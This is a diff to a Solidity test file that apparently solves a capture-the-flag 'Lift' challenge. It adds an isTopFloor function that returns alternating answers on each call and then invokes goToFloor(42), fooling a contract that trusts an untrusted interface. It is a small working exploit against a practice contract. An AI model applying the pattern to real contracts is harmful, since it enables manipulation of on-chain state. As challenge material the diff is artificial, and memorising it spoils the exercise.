@@ -9,6 +9,11 @@ contract LiftTest is BaseTest {
     Lift instance;
     bool isTop = true;
 
+    function isTopFloor(uint256 floor) public returns (bool) {
+        isTop = !isTop;
+        return isTop;
+    }
+
     function setUp() public override {
         super.setUp();
 
@@ -16,7 +21,7 @@ contract LiftTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        instance.goToFloor(42);
 
         checkSuccess();
     }
